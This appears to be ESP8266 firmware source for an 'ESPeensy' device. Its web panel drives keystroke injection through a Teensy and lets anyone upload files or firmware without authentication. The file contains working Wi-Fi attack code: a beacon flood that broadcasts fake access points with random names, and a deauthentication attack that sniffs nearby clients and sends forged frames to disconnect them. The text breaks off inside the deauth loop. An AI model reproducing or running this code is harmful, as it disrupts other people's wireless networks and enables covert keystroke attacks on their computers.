// ---------------------------------
// Includes
// ---------------------------------
#include <FS.h>
#include <Time.h>
#include <WiFiClient.h>
#include <ESP8266mDNS.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
extern "C" {
#include "user_interface.h"
}

// ---------------------------------
// Config-Variablen
// ---------------------------------
bool        ResetDone = false;
String      BootMode = ""; // AP, STA, DEAUTH, FAKEAP
File 		    UploadFile;
String 		  ClientIP;
String 		  fileName;
int 		    FSTotal;
int 		    FSUsed;
// WLAN ----------------------------
const char* ssid     	  = "TnSy35";		  // AP-SSID
const char* password  	= "Peensy3.5!";	// AP-PWD
const char* CLIssid     = "APName";     // CLI-SSID
const char* CLIpassword = "APPass";     // CLI-PWD
IPAddress 	ip(192, 168, 0, 1);			    // AP-IP
IPAddress 	netmask(255, 255, 255, 0);	// AP-NM
const char* DNSName     = "TnSy35";     // AP-DNS

// ---------------------------------
// HTML-Header
// ---------------------------------
String Head1 = "<HTML><HEAD><meta name='viewport' content='width=device-width, initial-scale=1'></meta><title>ESPeensy Control Panel</title><STYLE>* {font-family:verdana;font-size:14px;border-radius:3px;Margin:3px;Padding:2px;}div {Border:1px solid grey;Margin-Bottom:7px;background-color:#E6E6E6;}";
String Head2 = "h4 {Margin-Top:-2px;Margin-Left:-2px;Margin-Right:-2px;Padding:3px;background-color:#BDBDBD;}div>a{font-family:verdana;font-size:16px;Color:White;}div>a.Mark{background-color:#E6E6E6;color:black}Input,Select,Button{Border:1px solid lightgrey;Height:30px;Width:99%;Margin:0px;}";
String Head3 = "Input:Hover,Select:Hover,Button:Hover,tr:hover{box-shadow: 0 0 0 1px #0080FF inset}table {Margin-Top:8px;width:99%;border-collapse:collapse;}th {text-align:left;height:20px;}td{Padding-right:6px}tr:nth-child(even) {background-color: #D8D8D8;}tr:first-child {box-shadow: 0 0 0 0px #0080FF inset}";
String Head4 = "</STYLE></HEAD><BODY><DIV Style='background-color:#696969;Color:White;border-top: 2px solid blue;'><a Href='/'>Teensy Controls</a><a Href='wifi'>Wifi Settings</a><a Href='fupload'>File Manager</a><a Href='updatefwm'>Firmware Manager</a></DIV>";

// ---------------------------------
// Wifi-FakeAP Variablen
// ---------------------------------
String alfa = "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_";
uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xc0, 0x6c,  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0x64, 
                0x00,   0x01, 0x04, 0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 
                0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,  0x04};    
                 
// ---------------------------------
// Wifi-DeAuth
// ---------------------------------
#define ETH_MAC_LEN 6
#define MAX_APS_TRACKED 100
#define MAX_CLIENTS_TRACKED 200
uint8_t channel = 0;
uint8_t packet_buffer[64];
uint8_t template_da[26] = {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x6a, 0x01, 0x00};
uint8_t broadcast1[3] = { 0x01, 0x00, 0x5e };
uint8_t broadcast2[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
uint8_t broadcast3[3] = { 0x33, 0x33, 0x00 };
                
//------------------------------------------------
// Init WebServer
//------------------------------------------------
ESP8266WebServer  server(80);
MDNSResponder     mdns;
WiFiClient 	      client;

//------------------------------------------------
// Setup
//------------------------------------------------
void setup(void){
  Serial.begin(115200);
  InitSPIFFS();

  // AP, STA, DEAUTH, FAKEAP
  if (SPIFFS.exists("/WifiDeAuth")) {SetupDeAuth()                    ;BootMode="DEAUTH"  ;Serial.println("Mode: DeAuth");}
  if (SPIFFS.exists("/WifiFakeAP")) {SetupFakeAP()                    ;BootMode="FAKEAP"  ;Serial.println("Mode: FakeAP");}
  if (SPIFFS.exists("/WifiSta"))    {SetupApCli()  ;SetupWebServer()  ;BootMode="STA"     ;Serial.println("Mode: STA");}
  if (BootMode=="")                 {SetupWifiAP() ;SetupWebServer()  ;BootMode="AP"      ;Serial.println("Mode: AP");}
}

void SetupWebServer (void){

  server.on("/", web_root);
  server.on("/wifi", web_wifi);
  server.on("/fupload", web_fil);
  server.on("/updatefwm", web_fup);

  server.on ("/FakeAP", FakeAP);
  server.on ("/DeAuth", DeAuth);
 
  server.on("/format", handleFormat );
  server.on("/api", handle_api);
  server.on("/delete", handle_FileDelete);
  server.on("/restart", handle_esp_restart);


  // Upload firmware:
  server.on("/updatefw2", HTTP_POST, []() {
    server.sendHeader("Connection", "close");
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(200, "text/plain", (Update.hasError()) ? "FAIL" : "OK");
    ESP.restart();
  }, []()
  {
    HTTPUpload& upload = server.upload();
    if (upload.status == UPLOAD_FILE_START)
    {
      fileName = upload.filename;
      Serial.setDebugOutput(true);
      Serial.printf("Update: %s\n", upload.filename.c_str());
      uint32_t maxSketchSpace = (ESP.getFreeSketchSpace() - 0x1000) & 0xFFFFF000;
      if (!Update.begin(maxSketchSpace)) { //start with max available size
        Update.printError(Serial);
      }
    }
    else if (upload.status == UPLOAD_FILE_WRITE)
    {
      if (Update.write(upload.buf, upload.currentSize) != upload.currentSize)
      {
        Update.printError(Serial);
      }
    }
    else if (upload.status == UPLOAD_FILE_END)
    {
      if (Update.end(true)) //true to set the size to the current progress
      {
        Serial.printf("Update Success: %u\nRebooting...\n", upload.totalSize);
      }
      else
      {
        Update.printError(Serial);
      }
      Serial.setDebugOutput(false);

    }
    yield();
  });
  
  // upload file to SPIFFS
  server.on("/fupload2", HTTP_POST, []() {
    server.sendHeader("Connection", "close");
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(200, "text/plain", (Update.hasError()) ? "FAIL" : "OK");
  }, []() {
    HTTPUpload& upload = server.upload();
    if (upload.status == UPLOAD_FILE_START)
    {
      fileName = upload.filename;
      Serial.setDebugOutput(true);
      //fileName = upload.filename;
      Serial.println("Upload Name: " + fileName);
      String path;
      if (fileName.indexOf(".css") >= 0)
      {
        path = "/css/" + fileName;
      }
      else if (fileName.indexOf(".js") >= 0)
      {
        path = "/js/" + fileName;
      }
      else if (fileName.indexOf(".otf") >= 0 || fileName.indexOf(".eot") >= 0 || fileName.indexOf(".svg") >= 0 || fileName.indexOf(".ttf") >= 0 || fileName.indexOf(".woff") >= 0 || fileName.indexOf(".woff2") >= 0)
      {
        path = "/fonts/" + fileName;
      }
      else
      {
        path = "/" + fileName;
      }
      UploadFile = SPIFFS.open(path, "w");
      // already existing file will be overwritten!
    }
    else if (upload.status == UPLOAD_FILE_WRITE)
    {
      if (UploadFile)
        UploadFile.write(upload.buf, upload.currentSize);
      Serial.println(fileName + " size: " + upload.currentSize);
    }
    else if (upload.status == UPLOAD_FILE_END)
    {
      Serial.print("Upload Size: ");
      Serial.println(upload.totalSize);  // need 2 commands to work!
      if (UploadFile)
        UploadFile.close();
    }
    yield();
  });

  //called when the url is not defined here
  //use it to load content from SPIFFS
  server.onNotFound([]() {
    if (!handleFileRead(server.uri()))
      server.send(404, "text/plain", "FileNotFound");
  });

  InitMDNS();
  server.begin();
}
void SetupWifiAP    (void){
  delay(1000);
  WiFi.mode(WIFI_AP);                    // Configure to be a Access-Point
  WiFi.softAPConfig(ip, ip, netmask);   // configure ip address for softAP 
  WiFi.softAP(ssid, password);
}
void SetupApCli     (void){
  WiFi.mode(WIFI_STA);                    // Configure to be a Access-Point
  WiFi.begin(CLIssid, CLIpassword);
  int i = 0;
  while (WiFi.status() != WL_CONNECTED && i < 30)
  {delay(1000);Serial.print(".");}
  Serial.println(ssid);
  Serial.println(WiFi.localIP());
  GetExternalIP();
}
void SetupFakeAP    (void){
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1); 
}
void SetupDeAuth    (void){
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(1);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(promisc_cb);
  wifi_promiscuous_enable(1);
}

//------------------------------------------------
// SPIFFS Functions
//------------------------------------------------
void InitSPIFFS (){
  // Check if SPIFFS is OK
  // from Setup-Routine
  if (!SPIFFS.begin())
  {
    Serial.println("SPIFFS failed, needs formatting");
    handleFormat();
    delay(500);
    ESP.restart();
  }
  else
  {
    FSInfo fs_info;
    if (!SPIFFS.info(fs_info))
    {
      Serial.println("fs_info failed");
    }
    else
    {
      FSTotal = fs_info.totalBytes;
      FSUsed = fs_info.usedBytes;
    }
  }
}
void handleFormat(){
  server.send ( 200, "text/html", "OK");
  Serial.println("Format SPIFFS");
  if (SPIFFS.format())
  {
    if (!SPIFFS.begin())
    {
      Serial.println("Format SPIFFS failed");
    }
  }
  else
  {
    Serial.println("Format SPIFFS failed");
  }
  if (!SPIFFS.begin())
  {
    Serial.println("SPIFFS failed, needs formatting");
  }
  else
  {
    Serial.println("SPIFFS mounted");
  }
}
void handle_FileDelete(){
  if (server.args() == 0) return server.send(500, "text/plain", "BAD ARGS");
  String path = server.arg(0);if (!path.startsWith("/")) path = "/" + path;
  if (path == "/")
    return server.send(500, "text/plain", "BAD PATH");
  if (!SPIFFS.exists(path))
    return server.send(404, "text/plain", "FileNotFound");
  SPIFFS.remove(path);
  server.send(200, "text/plain", "");
  path = String();
}
bool handleFileRead(String path){
  Serial.println("handleFileRead: " + path);
  String contentType = getContentType(path);
  String pathWithGz = path + ".gz";
  if (SPIFFS.exists(pathWithGz) || SPIFFS.exists(path))
  {
    if (SPIFFS.exists(pathWithGz))
      path += ".gz";
    File file = SPIFFS.open(path, "r");
    if ( (path.startsWith("/css/") || path.startsWith("/js/") || path.startsWith("/fonts/")) &&  !path.startsWith("/js/insert"))
    {
      server.sendHeader("Cache-Control", " max-age=31104000");
    }
    else
    {
      server.sendHeader("Connection", "close");
    }
    size_t sent = server.streamFile(file, contentType);
    size_t contentLength = file.size();
    file.close();
    return true;
  }
  else
  {
    //Serial.println(path);
  }
  return false;
}

//------------------------------------------------
// MDNS Functions
//------------------------------------------------
void InitMDNS(){
  if (!mdns.begin(DNSName, WiFi.localIP())) {
    Serial.println("Error setting up MDNS responder!");
    while (1) {
      delay(1000);
    }
  }
}

//------------------------------------------------
// Pages
//------------------------------------------------
void web_root(){
  delay(500);
  String Content = "";
  Content += "<div><h4>ESP8266 Status</h4>";
  Content += "<table><tr><th><a href='restart'>Restart ESP8266</a></th></tr></table></div><div><h4>ESPeensy Status</h4><table><tr><th><a href='DCL?PAR=NUM'>NUM</a></th>";
  Content += "<th><a href='DCL?PAR=CAPS'>CAPS</a></th><th><a href='DCL?PAR=SCRL'>SCRL</a></th></tr></table></div><div><h4>ESPeensy Control Panel</h4>";
  Content += "<table><TR></TR><tr><form action='DCF'><td>Start Script</td><td colspan=2><select  Style='Height:32px;' name='PAR'><option value='1.txt'>1.txt</option>";
  Content += "<option value='2.txt'>2.txt</option><option value='3.txt'>3.txt</option><option value='4.txt'>4.txt</option><option value='5.txt'>5.txt</option>";
  Content += "<option value='6.txt'>6.txt</option><option value='7.txt'>7.txt</option><option value='8.txt'>8.txt</option><option value='9.txt'>9.txt</option>";
  Content += "<option value='10.txt'>10.txt</option><option value='11.txt'>11.txt</option><option value='12.txt'>12.txt</option><option value='13.txt'>13.txt</option>";
  Content += "<option value='14.txt'>14.txt</option><option value='15.txt'>15.txt</option><option value='16.txt'>16.txt</option></select>";
  Content += "</td><td><button type='submit'>Go!</button></td></form></tr><tr><form action='DCL'><td>Send String</td><td><select  Style='Height:32px;' name='PAR'>";
  Content += "<option value='STRING'>STRING</option><option value='STRING-ENTER'>STRING-ENTER</option></select></td><td><input type='text' name='STR'></input></td>";
  Content += "<td><button type='submit'>Go!</button></td></form></tr><tr><form action='DCC'><td>Send Command</td><td><select  Style='Height:32px;' name='PAR'>";
  Content += "<option value='ALT'>ALT</option><option value='CTRL'>CTRL</option><option value='SHIFT'>SHIFT</option><option value='COMMAND'>COMMAND</option>";
  Content += "<option value='WINDOWS'>WINDOWS</option><option value='ENTER'>ENTER</option><option value='MENU'>MENU</option><option value='TAB'>TAB</option>";
  Content += "<option value='ALT-SHIFT'>ALT-SHIFT</option><option value='CTRL-ALT'>CTRL-ALT</option><option value='CTRL-SHIFT'>CTRL-SHIFT</option>";
  Content += "<option value='CTRL-ESC'>CTRL-ESC</option><option value='DOWNARROW'>DOWNARROW</option><option value='UPARROW'>UPARROW</option>";
  Content += "<option value='LEFTARROW'>LEFTARROW</option><option value='RIGHTARROW'>RIGHTARROW</option></select></td><td><input type='text' name='STR'></input></td>";
  Content += "<td><button type='submit'>Go!</button></td></form></tr></table></div>By Phreak87 & Roctopuschl</body></html>";
  server.send ( 200, "text/html", Head1 + Head2 + Head3 + Head4 + Content);
}
void web_fup(){
String Content = "";
  Content += "<DIV><H4>Upload Firmware (.bin or .hex Files only)</H4>";
  Content += "<Table><TR><form method='POST' action='/fupload2' enctype='multipart/form-data'><TD><input type='file' name='Update' multiple></TD>";
  Content += "<TD><input type='submit' value='Update'></TD></form></TR></Table></DIV></BODY></HTML>";
  server.send ( 200, "text/html", Head1 + Head2 + Head3 + Head4 + Content);
}
void web_wifi(){
  delay(500);
  String ssid;
  uint8_t encryptionType;
  int32_t RSSI;
  uint8_t* BSSID;
  int32_t channel;
  bool isHidden;
  String HTML = "";
  int netcount = WiFi.scanNetworks();
  for (int n = 0; n < netcount; n++) {
    WiFi.getNetworkInfo(n, ssid, encryptionType, RSSI, BSSID, channel, isHidden);
    HTML += "<TR><TD>";
    HTML += ssid;
    HTML += "</TD><TD>";
    HTML += String(encryptionType);
    HTML += "</TD><TD>";
    HTML += String(RSSI);
    HTML += "</TD><TD>";
    // HTML += BSSID;
    // HTML += "</TD><TD>";
    HTML += String(channel);
    HTML += "</TD><TD>";
    HTML += String(isHidden);
    HTML += "</TD><TR>";
  }
  String Content = "";
  Content += "<DIV><H4>Wifi Attacks: if you select a Wifi-Attack the device will restart and start the attack<BR>You wont be able to connect to the Webinterface if the Attack is running.<BR> to Stop the Attack short press the flash button and then press the Reset Button)</H4>";
  Content += "<Table><TR><TD><Button><a href='DeAuth'>Wifi-DeAuth</a></Button></TD><TD><Button><a href='FakeAP'>Wifi-FakeAP</a></Button></TD>";
  Content += "</TR></Table></DIV><DIV><H4>Additional Information</H4><Table><TR><TH>Internal</TH><TH>External</TH></TR><TR><TD Width='50%'>";
  Content += "<i>IP-Adress: " + String(WiFi.localIP()) + "</i><BR><i>Subnetmask: " + WiFi.subnetMask() + "</i><BR><i>DNS-Server: {DNSINTERNAL}</i><BR><i>Gateway: " + WiFi.gatewayIP() + "</i></TD><TD Width='50%'>";
  Content += "<i>IP-Adress: " + GetExternalIP() + "</i><BR><i>API.IPIFY.ORG</i><BR></TD></TR></Table></DIV><DIV class='div1'><H4>Wifi-APs</H4><table><TH>SSID</TH>";
  Content += "<TH>ENC</TH><TH>STRN</TH><TH>QUAL</TH><TH>PASS</TH>" + HTML + "</table>";
  Content += "</DIV></BODY></HTML>";
  server.send ( 200, "text/html", Head1 + Head2 + Head3 + Head4 + Content);
}
void web_fil(){
  String HTML = "<br>Files on flash:<br>";
  Dir dir = SPIFFS.openDir("/");
  while (dir.next())
  {
    fileName = dir.fileName();
    size_t fileSize = dir.fileSize();
    HTML += "<TR><TD>";
    HTML += fileName.c_str();
    HTML += "</TD><TD>";
    HTML += formatBytes(fileSize).c_str();
    HTML += "</TD><TD>";
    HTML += "<a href='/delete?PAR=" + fileName + "'>Delete</a>";
    HTML += "</TD><TD>";
    HTML += "<a href='" + fileName + "'>Open</a>";
    HTML += "</TD><TR>";
  }
  FSInfo fs_info;SPIFFS.info(fs_info);
  String BT = String(formatBytes(fs_info.totalBytes));
  String UB = String(formatBytes(fs_info.usedBytes));
  String Content = "";
  Content += "<DIV><H4>Upload Files (Webfiles only, Multiple Files possible)</H4>";
  Content += "<Table><TR><form method='POST' action='/fupload2' enctype='multipart/form-data'><TD><input type='file' name='Upload' multiple>";
  Content += "</TD><TD><input type='submit' value='Upload'></TD></form></TR></Table></DIV><DIV><H4>Additional Information and Format</H4>";
  Content += "<Table><TR><TD><i>TotalBytes: " + BT + "</i><BR><i>UsedBytes: " + UB + "</i></TD><TD><Button>Format</Button></TD></TR></Table></DIV>";
  Content += "<DIV class='div1'><H4>Files on SPIFFS Storage</H4><table><TH>Filename</TH><TH>Filesize</TH>" + HTML + "</table></DIV></BODY></HTML>";
  server.send ( 200, "text/html", Head1 + Head2 + Head3 + Head4 + Content);
}

String getContentType(String filename) {
  if (server.hasArg("download")) return "application/octet-stream";
  else if (filename.endsWith(".htm")) return "text/html";
  else if (filename.endsWith(".html")) return "text/html";
  else if (filename.endsWith(".css")) return "text/css";
  else if (filename.endsWith(".js")) return "application/javascript";
  else if (filename.endsWith(".png")) return "image/png";
  else if (filename.endsWith(".gif")) return "image/gif";
  else if (filename.endsWith(".jpg")) return "image/jpeg";
  else if (filename.endsWith(".ico")) return "image/x-icon";
  else if (filename.endsWith(".xml")) return "text/xml";
  else if (filename.endsWith(".pdf")) return "application/x-pdf";
  else if (filename.endsWith(".zip")) return "application/x-zip";
  else if (filename.endsWith(".gz")) return "application/x-gzip";
  return "text/plain";
}
String formatBytes(size_t bytes) {
  if (bytes < 1024) {
    return String(bytes) + "B";
  } else if (bytes < (1024 * 1024)) {
    return String(bytes / 1024.0) + "KB";
  } else if (bytes < (1024 * 1024 * 1024)) {
    return String(bytes / 1024.0 / 1024.0) + "MB";
  } else {
    return String(bytes / 1024.0 / 1024.0 / 1024.0) + "GB";
  }
}
String GetExternalIP(void){
  WiFiClient client;
  if (!client.connect("api.ipify.org", 80)) {Serial.println("connection failed");return "";}
  client.print("GET / HTTP/1.1\r\nHost: api.ipify.org\r\n\r\n");
                unsigned long timeout = millis();
                while (client.available() == 0) {
                  if (millis() - timeout > 5000) {
                    Serial.println(">>> Client Timeout !");
                    client.stop();
                    return "";
                  }
                }
  String lines = "";
  while(client.available()){lines += client.readString();}
  int value_index = lines.lastIndexOf("\r");
  String value_string = lines.substring(value_index);
  return(value_string);
}

// LOOP
void loop(void){
  if (BootMode=="AP")     {server.handleClient();}
  if (BootMode=="STA")    {server.handleClient();}
  if (BootMode=="FAKEAP") {LoopFakeAP();}
  if (BootMode=="DEAUTH") {LoopDeauth();}
  
  if (ResetDone==false){
      if (digitalRead(0) == 0){
        handleFormat();
        ResetDone = true;
      }
  }
}

// handles

void handle_api(){
  // Get vars for all commands
  String action = server.arg("PAR");
  String value = server.arg("STR");

  if (action == "clean" && value == "start")
  {
    // handle_roomba_start();

  }

  if (action == "dock" && value == "home")
  {
    // handle_roomba_dock();
  }
  if (action == "reset" && value == "true")
  {
    server.send ( 200, "text/html", "Reset ESP OK");
    delay(500);
    Serial.println("RESET");
    ESP.restart();
  }
}
void handle_update_upload(){
  if (server.uri() != "/update2") return;
  HTTPUpload& upload = server.upload();
  if (upload.status == UPLOAD_FILE_START) {
    Serial.setDebugOutput(true);
    Serial.printf("Update: %s\n", upload.filename.c_str());
    uint32_t maxSketchSpace = (ESP.getFreeSketchSpace() - 0x1000) & 0xFFFFF000;
    if (!Update.begin(maxSketchSpace)) { //start with max available size
      Update.printError(Serial);
    }
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
      Update.printError(Serial);
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (Update.end(true)) { //true to set the size to the current progress
      Serial.printf("Update Success: %u\nRebooting...\n", upload.totalSize);
    } else {
      Update.printError(Serial);
    }
    Serial.setDebugOutput(false);
  }
  yield();
}
void handle_update_html2(){
  server.sendHeader("Connection", "close");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  delay (500);
  server.send(200, "text/plain", (Update.hasError()) ? "Firmware flash failed" : "Firmware flashing ok");
  ESP.restart();
}
void handle_esp_restart() {
  ESP.restart();
}

//------------------------------------------------
// FakeAP - Functions
//------------------------------------------------
void FakeAP(){
  File f = SPIFFS.open("/WifiFakeAP", "w");
  f.print ("");
  f.close();
  delay(500);
  ESP.restart();
}
void LoopFakeAP(){
    byte usechannel = random(1,12); 
    wifi_set_channel(channel);

    // Randomize SRC MAC
    packet[10] = packet[16] = random(256);
    packet[11] = packet[17] = random(256);
    packet[12] = packet[18] = random(256);
    packet[13] = packet[19] = random(256);
    packet[14] = packet[20] = random(256);
    packet[15] = packet[21] = random(256);

    // Randomize SSID (Fixed size 6. Lazy right?)
    packet[38] = alfa[random(65)];
    packet[39] = alfa[random(65)];
    packet[40] = alfa[random(65)];
    packet[41] = alfa[random(65)];
    packet[42] = alfa[random(65)];
    packet[43] = alfa[random(65)];
    
    packet[56] = usechannel;
    
    wifi_send_pkt_freedom(packet, 57, 0);
    delay(1);
}

//------------------------------------------------
// DeAuth - Functions
//------------------------------------------------
struct   beaconinfo{
  uint8_t bssid[ETH_MAC_LEN];
  uint8_t ssid[33];
  int ssid_len;
  int channel;
  int err;
  signed rssi;
  uint8_t capa[2];
};
struct   clientinfo{
  uint8_t bssid[ETH_MAC_LEN];
  uint8_t station[ETH_MAC_LEN];
  uint8_t ap[ETH_MAC_LEN];
  int channel;
  int err;
  signed rssi;
  uint16_t seq_n;
};

beaconinfo aps_known[MAX_APS_TRACKED];                    
int aps_known_count = 0;                                  
int nothing_new = 0;
clientinfo clients_known[MAX_CLIENTS_TRACKED];            
int clients_known_count = 0;                              
bool friendly_device_found = false;
uint8_t *address_to_check;

struct   RxControl {
  signed rssi: 8;
  unsigned rate: 4;
  unsigned is_group: 1;
  unsigned: 1;
  unsigned sig_mode: 2;
  unsigned legacy_length: 12;
  unsigned damatch0: 1;
  unsigned damatch1: 1;
  unsigned bssidmatch0: 1;
  unsigned bssidmatch1: 1;
  unsigned MCS: 7;
  unsigned CWB: 1;
  unsigned HT_length: 16;
  unsigned Smoothing: 1;
  unsigned Not_Sounding: 1;
  unsigned: 1;
  unsigned Aggregation: 1;
  unsigned STBC: 2;
  unsigned FEC_CODING: 1;
  unsigned SGI: 1;
  unsigned rxend_state: 8;
  unsigned ampdu_cnt: 8;
  unsigned channel: 4;
  unsigned: 12;
};
struct   LenSeq {
  uint16_t length;
  uint16_t seq;
  uint8_t  address3[6];
};
struct   sniffer_buf {
  struct RxControl rx_ctrl;
  uint8_t buf[36];
  uint16_t cnt;
  struct LenSeq lenseq[1];
};
struct   sniffer_buf2 {
  struct RxControl rx_ctrl;
  uint8_t buf[112];
  uint16_t cnt;
  uint16_t len;
};
struct   beaconinfo parse_beacon(uint8_t *frame, uint16_t framelen, signed rssi){
  struct beaconinfo bi;
  bi.ssid_len = 0;
  bi.channel = 0;
  bi.err = 0;
  bi.rssi = rssi;
  int pos = 36;

  if (frame[pos] == 0x00) {
    while (pos < framelen) {
      switch (frame[pos]) {
        case 0x00: //SSID
          bi.ssid_len = (int) frame[pos + 1];
          if (bi.ssid_len == 0) {
            memset(bi.ssid, '\x00', 33);
            break;
          }
          if (bi.ssid_len < 0) {
            bi.err = -1;
            break;
          }
          if (bi.ssid_len > 32) {
            bi.err = -2;
            break;
          }
          memset(bi.ssid, '\x00', 33);
          memcpy(bi.ssid, frame + pos + 2, bi.ssid_len);
          bi.err = 0;  // before was error??
          break;
        case 0x03: //Channel
          bi.channel = (int) frame[pos + 2];
          pos = -1;
          break;
        default:
          break;
      }
      if (pos < 0) break;
      pos += (int) frame[pos + 1] + 2;
    }
  } else {
    bi.err = -3;
  }

  bi.capa[0] = frame[34];
  bi.capa[1] = frame[35];
  memcpy(bi.bssid, frame + 10, ETH_MAC_LEN);

  return bi;
}
struct   clientinfo parse_data  (uint8_t *frame, uint16_t framelen, signed rssi, unsigned channel){
  struct clientinfo ci;
  ci.channel = channel;
  ci.err = 0;
  ci.rssi = rssi;
  int pos = 36;
  uint8_t *bssid;
  uint8_t *station;
  uint8_t *ap;
  uint8_t ds;

  ds = frame[1] & 3;    
  switch (ds) {
  
    case 0:
      bssid = frame + 16;
      station = frame + 10;
      ap = frame + 4;
      break;
  
    case 1:
      bssid = frame + 4;
      station = frame + 10;
      ap = frame + 16;
      break;
   
    case 2:
      bssid = frame + 10;
    
      if (memcmp(frame + 4, broadcast1, 3) || memcmp(frame + 4, broadcast2, 3) || memcmp(frame + 4, broadcast3, 3)) {
        station = frame + 16;
        ap = frame + 4;
      } else {
        station = frame + 4;
        ap = frame + 16;
      }
      break;
    
    case 3:
      bssid = frame + 10;
      station = frame + 4;
      ap = frame + 4;
      break;
  }

  memcpy(ci.station, station, ETH_MAC_LEN);
  memcpy(ci.bssid, bssid, ETH_MAC_LEN);
  memcpy(ci.ap, ap, ETH_MAC_LEN);

  ci.seq_n = frame[23] * 0xFF + (frame[22] & 0xF0);

  return ci;
}
int      register_beacon(beaconinfo beacon){
  int known = 0;  
  for (int u = 0; u < aps_known_count; u++)
  {
    if (! memcmp(aps_known[u].bssid, beacon.bssid, ETH_MAC_LEN)) {
      known = 1;
      break;
    } 
  }
  if (! known)  
  {
    memcpy(&aps_known[aps_known_count], &beacon, sizeof(beacon));
    aps_known_count++;

    if ((unsigned int) aps_known_count >=
        sizeof (aps_known) / sizeof (aps_known[0]) ) {
      Serial.printf("exceeded max aps_known\n");
      aps_known_count = 0;
    }
  }
  return known;
}
int      register_client(clientinfo ci){
  int known = 0;  
  for (int u = 0; u < clients_known_count; u++)
  {
    if (! memcmp(clients_known[u].station, ci.station, ETH_MAC_LEN)) {
      known = 1;
      break;
    }
  }
  if (! known)
  {
    memcpy(&clients_known[clients_known_count], &ci, sizeof(ci));
    clients_known_count++;

    if ((unsigned int) clients_known_count >=
        sizeof (clients_known) / sizeof (clients_known[0]) ) {
      Serial.printf("exceeded max clients_known\n");
      clients_known_count = 0;
    }
  }
  return known;
}
void     print_beacon(beaconinfo beacon){
  if (beacon.err != 0) {
    
  } else {
    Serial.printf("BEACON: [%32s]  ", beacon.ssid);
    for (int i = 0; i < 6; i++) Serial.printf("%02x", beacon.bssid[i]);
    Serial.printf("   %2d", beacon.channel);
    Serial.printf("   %4d\r\n", beacon.rssi);
  }
}
void     print_client(clientinfo ci){
  int u = 0;
  int known = 0;  
  if (ci.err != 0) {
  } else {
    Serial.printf("CLIENT: ");
    for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.station[i]);
    Serial.printf(" works with: ");
    for (u = 0; u < aps_known_count; u++)
    {
      if (! memcmp(aps_known[u].bssid, ci.bssid, ETH_MAC_LEN)) {
        Serial.printf("[%32s]", aps_known[u].ssid);
        known = 1;
        break;
      } 
    }
    if (! known)  {
      Serial.printf("%22s", " ");
      for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.bssid[i]);
    }

    Serial.printf("%5s", " ");
    for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.ap[i]);
    Serial.printf("%5s", " ");

    if (! known) {
      Serial.printf("   %3d", ci.channel);
    } else {
      Serial.printf("   %3d", aps_known[u].channel);
    }
    Serial.printf("   %4d\r\n", ci.rssi);
  }
}
uint16_t create_packet(uint8_t *buf, uint8_t *c, uint8_t *ap, uint16_t seq){
  int i = 0;
  memcpy(buf, template_da, 26);
  memcpy(buf + 4, c, ETH_MAC_LEN);
  memcpy(buf + 10, ap, ETH_MAC_LEN);
  memcpy(buf + 16, ap, ETH_MAC_LEN);
  buf[22] = seq % 0xFF;
  buf[23] = seq / 0xFF;
  return 26;
  }
void     deauth(uint8_t *c, uint8_t *ap, uint16_t seq){
  uint8_t i = 0;
  uint16_t sz = 0;
  for (i = 0; i < 0x10; i++) {
    sz = create_packet(packet_buffer, c, ap, seq + 0x10 * i);
    wifi_send_pkt_freedom(packet_buffer, sz, 0);
    delay(1);
  }
}
void     promisc_cb(uint8_t *buf, uint16_t len){
  int i = 0;
  uint16_t seq_n_new = 0;
  if (len == 12) {
    struct RxControl *sniffer = (struct RxControl*) buf;
  } else if (len == 128) {
    struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
    struct beaconinfo beacon = parse_beacon(sniffer->buf, 112, sniffer->rx_ctrl.rssi);
    if (register_beacon(beacon) == 0) {
      print_beacon(beacon);
      nothing_new = 0;
    }
  } else {
    struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
    //Is data or QOS?
    if ((sniffer->buf[0] == 0x08) || (sniffer->buf[0] == 0x88)) {
      struct clientinfo ci = parse_data(sniffer->buf, 36, sniffer->rx_ctrl.rssi, sniffer->rx_ctrl.channel);
      if (memcmp(ci.bssid, ci.station, ETH_MAC_LEN)) {
        if (register_client(ci) == 0) {
          print_client(ci);
          nothing_new = 0;
        }
      }
    }
  }
}

void DeAuth(){
  File f = SPIFFS.open("/WifiDeAuth", "w");
  f.print ("");
  f.close();
  delay(500);
  ESP.restart();
}
void LoopDeauth(){
    while (true) {

    channel = 1;
    wifi_set_channel(channel);
    while (true) {
      nothing_new++;
      if (nothing_new > 200) {
        nothing_new = 0;

        wifi_promiscuous_enable(0);
        wifi_set_promiscuous_rx_cb(0);
        wifi_promiscuous_enable(1);
        for (int ua = 0; ua < aps_known_count; ua++) {
          if (aps_known[ua].channel == channel) {
            for (int uc = 0; uc < clients_known_count; uc++) {
              if (! memcmp(aps_known[ua].bssid, clients_known[uc].bssid, ETH_MAC_LEN)) {
                Serial.print("DeAuth to ---->");
                print_client(clients_known[uc]);
